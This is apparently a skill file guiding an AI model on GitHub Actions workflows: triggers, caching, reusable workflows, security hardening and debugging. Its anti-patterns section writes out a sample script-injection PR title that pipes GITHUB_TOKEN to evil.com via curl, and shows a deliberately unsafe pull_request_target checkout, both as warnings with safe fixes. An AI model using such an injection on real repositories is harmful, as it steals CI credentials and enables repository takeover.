---
name: github-actions-expert
description: "Expert guidance for GitHub Actions: writing CI/CD workflows, debugging failures, security hardening, caching, matrix builds, reusable workflows, composite actions, self-hosted runners, containers, artifacts, and deployments. Use whenever the user asks about GitHub Actions, `.github/workflows/`, workflow YAML, `on: push/pull_request/workflow_dispatch/schedule/release`, `runs-on`, `uses:`, `needs:`, action pinning, `GITHUB_TOKEN` permissions, `workflow_call`, `action.yml`, or debugging failed runs. Also trigger for contexts (`github.sha`, `secrets.*`, `matrix.*`, `steps.*.outputs`), caching (`actions/cache`), artifacts, `$GITHUB_OUTPUT`, `$GITHUB_ENV`, concurrency groups, environment protection rules, OIDC (`id-token: write`), service containers, or errors like 'Resource not accessible by integration'. Do NOT use for GitLab CI, Jenkins, CircleCI, or other non-GitHub CI."
---

# GitHub Actions Expert

Help the user write, debug, secure, and optimize GitHub Actions workflows. Prioritize working solutions with security best practices baked in — not afterthoughts.

## Start by understanding the situation

GitHub Actions questions often span several layers. Identify which layer matters before answering:

- Workflow authoring (YAML syntax, triggers, job structure)
- Event triggers and filtering (branches, paths, activity types)
- Job orchestration (dependencies, matrix strategies, concurrency)
- Actions and reusable workflows (using, creating, versioning)
- Security (secrets management, token permissions, supply chain)
- Performance (caching, artifacts, runner selection)
- Debugging (reading logs, diagnosing failures, re-running)
- Deployment (environments, protection rules, OIDC)

If context matters, ask early. The most useful missing details are usually:

- What language/framework the project uses (affects setup actions and caching)
- Whether they're on GitHub Free, Pro, Team, or Enterprise (affects available features)
- Whether they use self-hosted runners
- The actual error message or failed step from the logs
- Whether the repository is public or private (affects security model)

## Working style

- **Lead with the solution**, then explain why it works. Show the complete YAML when writing workflows — don't make the user assemble fragments.
- **Always pin actions to full commit SHAs** in examples for production workflows. Use tags only in quick demonstrations, and note the tradeoff.
- When debugging, **read the error message carefully** — GitHub Actions errors are often quite specific about what went wrong and where.
- **Show comparison tables** when choosing between approaches (e.g., reusable workflows vs composite actions, `actions/cache` vs setup-action built-in caching).
- **Call out common gotchas** for the topic at hand. Many Actions questions arise from hitting a specific sharp edge.

## Workflow fundamentals

A workflow is a YAML file in `.github/workflows/` that runs one or more jobs in response to events. The core structure:

```yaml
name: CI                              # Display name in the Actions tab
run-name: CI for ${{ github.ref_name }}  # Dynamic name for each run

on:                                    # What triggers this workflow
  push:
    branches: [main]
  pull_request:
    branches: [main]

permissions:                           # Restrict GITHUB_TOKEN scope
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest             # Runner environment
    steps:
      - uses: actions/checkout@<sha>   # Pin to SHA
      - run: echo "Hello"             # Shell command
```

### Event triggers

The `on` key controls when workflows run. The most common patterns:

| Trigger | Use case |
|---------|----------|
| `push` + `branches` | CI on commits to specific branches |
| `pull_request` | CI on PRs (runs on merge commit by default) |
| `workflow_dispatch` | Manual trigger with optional inputs |
| `schedule` (cron) | Periodic jobs (dependency updates, nightly builds) |
| `workflow_call` | Reusable workflow invocation |
| `release` | Publish packages or deploy on release |

**Filtering** narrows when a workflow fires. You can filter by branches, tags, paths, and activity types. Combining `branches` + `paths` means both must match. Use `branches-ignore` or `paths-ignore` for exclusion — you can't mix `branches` and `branches-ignore` for the same event, but you can use `!` patterns within `branches`. See `references/workflow-syntax-reference.md` § Filter Pattern Cheat Sheet for the complete glob pattern syntax (`*`, `**`, `?`, `[0-9]`, `!` negation).

**Gotcha**: `pull_request` triggers run on the *merge commit* of the PR branch into the base branch, not the PR branch tip. This matters for checkout and for understanding which SHA you're testing.

### Jobs and steps

Jobs run in parallel by default. Use `needs` to create dependencies:

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
      - run: npm test

  deploy:
    needs: test              # Waits for test to succeed
    runs-on: ubuntu-latest
    if: github.ref == 'refs/heads/main'
    steps:
      - run: echo "Deploying..."
```

Each job gets a fresh runner — no state carries over between jobs unless you use artifacts or outputs.

**Passing data between steps** — use `$GITHUB_OUTPUT`:
```yaml
- id: version
  run: echo "tag=v$(cat VERSION)" >> "$GITHUB_OUTPUT"
- run: echo "Version is ${{ steps.version.outputs.tag }}"
```

**Passing data between jobs** — use job outputs:
```yaml
jobs:
  prepare:
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.ver.outputs.tag }}
    steps:
      - id: ver
        run: echo "tag=v1.2.3" >> "$GITHUB_OUTPUT"

  deploy:
    needs: prepare
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying ${{ needs.prepare.outputs.version }}"
```

### Matrix strategies

Run the same job across multiple configurations:

```yaml
jobs:
  test:
    strategy:
      matrix:
        os: [ubuntu-latest, macos-latest, windows-latest]
        node: [18, 20, 22]
      fail-fast: false       # Don't cancel other runs on first failure
    runs-on: ${{ matrix.os }}
    steps:
      - uses: actions/setup-node@<sha>
        with:
          node-version: ${{ matrix.node }}
      - run: npm test
```

Use `include` to add specific combinations and `exclude` to skip combinations. The matrix context (`${{ matrix.* }}`) is available in job steps.

### Concurrency

Prevent duplicate runs with concurrency groups:

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true    # Cancel older runs for the same branch
```

This is especially important for deployment workflows — you don't want two deploys racing. Concurrency group names are case-insensitive. `cancel-in-progress` can be an expression — for example, cancel PRs but not release branches:

```yaml
concurrency:
  group: deploy-${{ github.ref }}
  cancel-in-progress: ${{ !contains(github.ref, 'release/') }}
```

### Runner selection

| Runner label | vCPUs | RAM | Notes |
|-------------|-------|-----|-------|
| `ubuntu-latest` | 4 (public) / 2 (private) | 16GB / 7GB | Maps to latest Ubuntu LTS |
| `ubuntu-24.04-arm` | 4 (public) / 2 (private) | 16GB / 7GB | ARM64 |
| `macos-latest` | 4 | 14GB | Apple silicon (M1) |
| `windows-latest` | 4 (public) / 2 (private) | 16GB / 7GB | Server 2022 |

ARM runners (`ubuntu-24.04-arm`, `ubuntu-22.04-arm`, `windows-11-arm`) are useful for native ARM builds. Public repos get 4-CPU runners; private repos get 2-CPU runners for `ubuntu-latest`.

### Defaults

Set default shell and working directory for all `run` steps — especially useful in monorepos:

```yaml
defaults:
  run:
    shell: bash
    working-directory: ./backend
```

Job-level `defaults.run` overrides workflow-level. Step-level `working-directory` overrides both. Only applies to `run:` steps, not `uses:` steps.

## Contexts and expressions

Expressions use `${{ }}` syntax and have access to contexts like `github`, `env`, `secrets`, `matrix`, `steps`, `needs`, `runner`, and `vars`.

Key patterns:
- **Conditionals**: `if: github.event_name == 'push'`
- **String functions**: `contains()`, `startsWith()`, `endsWith()`, `format()`
- **Status checks**: `success()`, `failure()`, `always()`, `cancelled()`
- **Hash files**: `hashFiles('**/package-lock.json')` for cache keys

**Gotcha**: In `if:` conditionals, the `${{ }}` wrapper is optional but recommended for clarity. However, comparing against strings requires them: `if: github.ref == 'refs/heads/main'`.

**Shell behavior**: The default shell on Linux (`bash -e {0}`) does NOT fail on pipe errors. Explicitly setting `shell: bash` uses `bash --noprofile --norc -eo pipefail {0}`, which does. This matters when piping commands. See `references/workflow-syntax-reference.md` § Shell Configuration for the full shell option table.

## Caching

Caching dramatically speeds up workflows. Two approaches:

**1. Setup actions with built-in caching** (simplest):
```yaml
- uses: actions/setup-node@<sha>
  with:
    node-version: 20
    cache: 'npm'             # Automatically caches ~/.npm
```

Available for: Node (npm/yarn/pnpm), Python (pip/pipenv/poetry), Java (gradle/maven), Ruby, Go, .NET.

**2. Manual caching with actions/cache** (full control):
```yaml
- uses: actions/cache@<sha>
  with:
    path: ~/.npm
    key: ${{ runner.os }}-npm-${{ hashFiles('**/package-lock.json') }}
    restore-keys: |
      ${{ runner.os }}-npm-
```

**Cache scope rules**: caches from the default branch are available to all branches. Feature branch caches are only available to that branch and PRs targeting it. PR caches are scoped to the merge ref. This means the first run on a new branch will always miss — it'll fall back to the default branch's cache.

## Reusable workflows

Factor out common workflow logic with `workflow_call`:

**Reusable workflow** (`.github/workflows/ci.yml` in the shared repo):
```yaml
on:
  workflow_call:
    inputs:
      node-version:
        required: true
        type: string
    secrets:
      NPM_TOKEN:
        required: false

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
      - uses: actions/setup-node@<sha>
        with:
          node-version: ${{ inputs.node-version }}
      - run: npm ci && npm test
```

**Caller workflow**:
```yaml
jobs:
  ci:
    uses: my-org/shared-workflows/.github/workflows/ci.yml@main
    with:
      node-version: '20'
    secrets: inherit          # Pass all secrets from the caller
```

**Reusable workflows vs composite actions**: Reusable workflows are entire workflow files called as jobs — they run on their own runners and have full job-level features (matrix, services, containers). Composite actions are steps bundled together — they run within an existing job. Choose reusable workflows for multi-step CI/CD pipelines; choose composite actions for reusable step sequences.

## Security

Security in GitHub Actions requires attention at every layer. These aren't optional hardening steps — they're the baseline for production workflows.

### Token permissions

Set the minimum necessary permissions for `GITHUB_TOKEN`. Always declare them explicitly:

```yaml
permissions:
  contents: read       # Default should be read-only
  pull-requests: write # Only if needed (e.g., posting comments)
```

Set `permissions: {}` (empty) at the workflow level, then grant specific permissions per job. This follows the principle of least privilege and prevents accidental scope creep. When you specify any permission explicitly, all unspecified scopes default to `none`.

There are 15+ available permission scopes including `actions`, `attestations`, `checks`, `contents`, `deployments`, `discussions`, `id-token`, `issues`, `models`, `packages`, `pages`, `pull-requests`, `security-events`, and `statuses`. See `references/workflow-syntax-reference.md` § All Available Permissions for the full table.

**Fork/Dependabot behavior**: PRs from forks and Dependabot-triggered runs always get read-only tokens, regardless of the `permissions` declaration.

### Pin actions to commit SHAs

Tags can be moved. A maintainer's compromised account can push malicious code under an existing tag. Pin to the full SHA:

```yaml
# Safe — immutable reference
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2

# Risky — tag can be re-pointed
- uses: actions/checkout@v4
```

Use Dependabot to keep pinned SHAs up to date automatically.

### Secrets handling

- Never echo secrets or use them in string interpolation where they might leak into logs
- Use intermediate environment variables for untrusted input to prevent script injection:
  ```yaml
  - env:
      TITLE: ${{ github.event.pull_request.title }}
    run: echo "$TITLE"   # Safe — variable, not interpolation
  ```
- Structured data (JSON, XML) as secrets can defeat log redaction — use individual values
- `GITHUB_TOKEN` expires when the job ends and is scoped to the repository

### Supply chain

- Audit third-party actions before using them — check the source repository
- Fork critical actions into your org for full control
- Use `CODEOWNERS` to require review for `.github/workflows/` changes
- Enable Dependabot for action version updates

### OIDC for cloud deployments

Instead of storing long-lived cloud credentials as secrets, use OpenID Connect:

```yaml
permissions:
  id-token: write
  contents: read

steps:
  - uses: aws-actions/configure-aws-credentials@<sha>
    with:
      role-to-arn: arn:aws:iam::123456789:role/deploy
      aws-region: us-east-1
```

This generates short-lived tokens per workflow run — no static secrets to rotate or leak.

## Debugging workflow failures

When a workflow fails, work through this checklist:

1. **Read the error message** in the failed step's log. Expand the failing step and read the full output — the answer is usually there.
2. **Check the trigger** — did the workflow run on the right event/branch/path? Look at the "Triggered by" section.
3. **Check permissions** — `GITHUB_TOKEN` permission errors show up as 403 or "Resource not accessible by integration".
4. **Check runner availability** — self-hosted runner offline? Label mismatch?
5. **Check action versions** — a breaking change in an action you're using? Pinning to SHA prevents this.
6. **Enable debug logging** — set `ACTIONS_STEP_DEBUG` secret to `true` for verbose output.
7. **Add diagnostic steps** — temporarily add steps that print environment variables, file listings, or context info.

**Common failure patterns**:

| Symptom | Likely cause |
|---------|-------------|
| "Resource not accessible by integration" | Missing `permissions` declaration |
| Workflow doesn't trigger | Branch/path filter mismatch, or fork PR (needs `pull_request_target`) |
| Cache miss every time | Key mismatch, or running on a branch without default-branch cache |
| "No space left on device" | Large build artifacts filling the runner disk |
| Job hangs indefinitely | Missing timeout, or interactive prompt in a script |
| "Context access might be invalid" | Using a context in a place where it's not available |

### Using the GitHub MCP tools for debugging

When the user has a failing workflow run, use the GitHub Actions MCP tools to investigate:

1. `actions_list` with method `list_workflow_runs` — find recent runs and their statuses
2. `actions_list` with method `list_workflow_jobs` — see which jobs failed
3. `get_job_logs` — read the actual log output from failed jobs
4. `actions_get` with method `get_workflow` — inspect the workflow configuration

## Performance optimization

- **Cache aggressively** — dependency caches, build caches, Docker layer caches
- **Use `fail-fast: false`** in matrix builds only when you need all results; keep it `true` (default) when one failure means the whole matrix is broken
- **Split large workflows** into smaller ones triggered by `workflow_run` or path filters
- **Use larger runners** (if available) for resource-intensive builds
- **Set timeouts** on jobs (`timeout-minutes`) to catch hung processes early
- **Minimize checkout depth** with `fetch-depth: 1` (shallow clone) when full history isn't needed
- **Parallelize** — structure independent test suites as separate jobs rather than sequential steps

## Artifacts

Artifacts pass files between jobs or preserve build outputs for download.

**Upload** from one job:
```yaml
- uses: actions/upload-artifact@<sha>
  with:
    name: build-output
    path: dist/
    retention-days: 7          # Default is 90; lower to save storage
    if-no-files-found: error   # Fail if nothing matches
```

**Download** in another job:
```yaml
- uses: actions/download-artifact@<sha>
  with:
    name: build-output
    path: dist/
```

**Key rules**:
- Artifacts are immutable once uploaded — use unique names per matrix combination (`name: build-${{ matrix.os }}`)
- The download job must declare `needs:` on the upload job
- Artifacts are scoped to the workflow run — they can't be shared across runs (use caching for that)
- Large artifacts (>1 GB) slow down workflows significantly — cache dependencies instead of uploading them as artifacts

## Workflow commands

Commands written to `stdout` with `::` prefix control runner behavior:

| Command | Usage | Purpose |
|---------|-------|---------|
| `$GITHUB_OUTPUT` | `echo "key=value" >> "$GITHUB_OUTPUT"` | Set step outputs for use in later steps/jobs |
| `$GITHUB_ENV` | `echo "KEY=value" >> "$GITHUB_ENV"` | Set environment variables for subsequent steps |
| `$GITHUB_STEP_SUMMARY` | `echo "### Results" >> "$GITHUB_STEP_SUMMARY"` | Add Markdown to the job summary page |
| `::error::` | `echo "::error file=app.js,line=10::Error message"` | Create error annotation on a file |
| `::warning::` | `echo "::warning::This is deprecated"` | Create warning annotation |
| `::add-mask::` | `echo "::add-mask::$SENSITIVE_VALUE"` | Mask a value in all future log output |
| `::group::` / `::endgroup::` | `echo "::group::Install deps"` | Collapsible log group |

**Gotcha**: The deprecated `set-output` command (`::set-output name=key::value`) was removed. Always use `$GITHUB_OUTPUT` file. Same for `set-env` — use `$GITHUB_ENV`.

**Multi-line outputs** require a delimiter:
```yaml
- id: changelog
  run: |
    echo "content<<EOF" >> "$GITHUB_OUTPUT"
    cat CHANGELOG.md >> "$GITHUB_OUTPUT"
    echo "EOF" >> "$GITHUB_OUTPUT"
```

## Container jobs and service containers

Run jobs inside Docker containers or spin up service containers (databases, caches) alongside your job:

**Job container** — run the entire job in a specified image:
```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    container:
      image: node:20-slim
      env:
        NODE_ENV: test
    steps:
      - uses: actions/checkout@<sha>
      - run: npm ci && npm test
```

**Service containers** — run alongside the job (accessed via `localhost` in container jobs, or via `localhost` with mapped ports on the runner):
```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:16
        env:
          POSTGRES_PASSWORD: testpass
          POSTGRES_DB: testdb
        ports:
          - 5432:5432
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
      redis:
        image: redis:7
        ports:
          - 6379:6379
    steps:
      - uses: actions/checkout@<sha>
      - run: npm test
        env:
          DATABASE_URL: postgresql://postgres:testpass@localhost:5432/testdb
          REDIS_URL: redis://localhost:6379
```

**Gotcha**: When the job itself runs in a container (`container:` key), services are accessed by their service name as hostname (e.g., `postgres` not `localhost`). When the job runs directly on the runner, use `localhost` with mapped ports. When you don't specify a host port (e.g., `- 6379/tcp`), Docker assigns a random port — access it via `${{ job.services.redis.ports['6379'] }}`.

## Self-hosted runners

Self-hosted runners give you control over hardware, OS, and installed software. They're essential for builds requiring GPUs, specific architectures (ARM), private network access, or custom toolchains.

**Using self-hosted runners**:
```yaml
jobs:
  build:
    runs-on: [self-hosted, linux, x64, gpu]   # Match by labels
    steps:
      - uses: actions/checkout@<sha>
      - run: make build
```

**Security considerations** — self-hosted runners are persistent, so they require extra care:

| Risk | Mitigation |
|------|------------|
| Untrusted code from forks | Never use self-hosted runners on public repos — fork PRs can run arbitrary code on your infrastructure |
| Persistent environment | Use ephemeral runners (tear down after each job) or run in containers to prevent cross-job contamination |
| Credential exposure | Don't store secrets on the runner filesystem — use GitHub Secrets and OIDC instead |
| Stale software | Keep runner software and OS updated; use runner groups to manage fleet-wide updates |

**Runner groups** (organization/enterprise feature) let you restrict which repos can use which runners — essential for security isolation.

## Creating custom actions

Three types of actions you can create:

| Type | Best for | Runs on |
|------|----------|---------|
| **Composite** | Bundling shell steps with inputs/outputs | Same runner as the calling job |
| **JavaScript** | Complex logic, API calls, cross-platform | Node.js runtime on the runner |
| **Docker** | Specific environments, system dependencies | Container on the runner (Linux only) |

**Composite action** (`action.yml`):
```yaml
name: Setup and Cache
description: Install deps with smart caching
inputs:
  node-version:
    default: '20'
outputs:
  cache-hit:
    description: Whether cache was restored
    value: ${{ steps.cache.outputs.cache-hit }}
runs:
  using: composite
  steps:
    - uses: actions/setup-node@<sha>
      with:
        node-version: ${{ inputs.node-version }}
        cache: 'npm'
      id: cache
    - run: npm ci
      shell: bash                # Required for composite action run steps
```

**Gotcha**: Composite actions must specify `shell:` on every `run:` step. This is easy to forget and causes confusing errors.

**Publishing**: Actions can live in their own repo (referenced as `owner/repo@ref`), in a subdirectory of your repo (referenced as `./.github/actions/my-action`), or on the GitHub Marketplace.

## Anti-patterns

Common mistakes that cause subtle or recurring problems:

### Don't use `pull_request_target` with `actions/checkout` on the PR branch

```yaml
# DANGEROUS — runs untrusted PR code with write access to the base repo
on: pull_request_target
steps:
  - uses: actions/checkout@<sha>
    with:
      ref: ${{ github.event.pull_request.head.sha }}  # Checks out PR code
  - run: npm test  # Attacker-controlled code runs with base repo's GITHUB_TOKEN
```

`pull_request_target` gives the workflow the base repo's permissions. If you then check out the PR's code and *run* it, an attacker can craft a PR that exfiltrates secrets. Only use `pull_request_target` for metadata operations (labeling, commenting) — never to execute PR code.

### Don't interpolate untrusted input directly in `run:`

```yaml
# VULNERABLE to script injection
- run: echo "PR title is ${{ github.event.pull_request.title }}"
```

An attacker can set a PR title to `"; curl http://evil.com/steal?token=$GITHUB_TOKEN #` and inject arbitrary commands. Always use an intermediate environment variable:

```yaml
# Safe
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR title is $PR_TITLE"
```

### Don't use `always()` when you mean `success() || failure()`

`always()` runs even when the workflow is **cancelled** — which can cause jobs to run when a user explicitly hit "Cancel". Use `if: success() || failure()` to run on both success and failure but respect cancellation.

### Don't rely on `set-output` or `save-state` (deprecated)

These workflow commands were deprecated and disabled. Use `$GITHUB_OUTPUT` and `$GITHUB_STATE` files instead. If you see `::set-output` in old examples, replace with the file-based approach.

### Don't hardcode runner images to a specific version

```yaml
# Brittle — this image will eventually be removed
runs-on: ubuntu-22.04

# Better — tracks the latest LTS
runs-on: ubuntu-latest
```

Exception: if you need reproducible builds and are willing to update the version manually, pinning is fine. But test with `ubuntu-latest` periodically to catch compatibility issues early.

### Don't store build artifacts in cache

Cache is for **dependencies** (things you download but don't change). Artifacts are for **build outputs** (things your workflow produces). Caches can be evicted and are shared across branches with specific scoping rules. Artifacts are per-run and immutable.

## Common workflow recipes

For complete working examples of these patterns, see `references/workflow-patterns.md`:

- Node.js CI with caching and matrix testing
- Python, Go, and Rust CI patterns
- Docker build and push to GHCR
- Release automation with semantic versioning
- Deployment with environment protection rules and OIDC
- Monorepo path-filtered workflows
- Reusable CI workflows with inputs and secrets
- Scheduled dependency auditing
- PR automation (labeling, auto-assign)
- Composite action examples

## Size limits and constraints

Key limits to keep in mind when building workflows:

| Limit | Value |
|-------|-------|
| `run:` command body | 21,000 characters max |
| Job outputs | 1 MB per job, 50 MB per workflow run |
| Matrix combinations | 256 jobs per matrix |
| `workflow_dispatch` inputs | 25 inputs, 65,535 chars total payload |
| Path filters: changed files | Max 300 files diffed; >1,000 commits always triggers |
| Cron schedule minimum | Every 5 minutes |
| Step timeout | 360 minutes max (both GitHub-hosted and self-hosted) |
| `GITHUB_TOKEN` lifetime | Expires when job ends or after 24 hours (whichever is first) |

## Reference files

For detailed syntax tables and advanced patterns, consult these bundled references:

- `references/workflow-patterns.md` — 12 complete, copy-paste workflow recipes (Node, Python, Go, Rust, Docker, deploy, monorepo, reusable, scheduled, PR automation)
- `references/workflow-syntax-reference.md` — Filter pattern cheat sheet, full permissions table, shell configuration, `defaults.run`, matrix advanced patterns, `continue-on-error`/`fail-fast` interaction, service container networking, `workflow_dispatch` input types, cron syntax, matrix job outputs
- `references/official-sources.md` — Links to official GitHub documentation and key action repositories
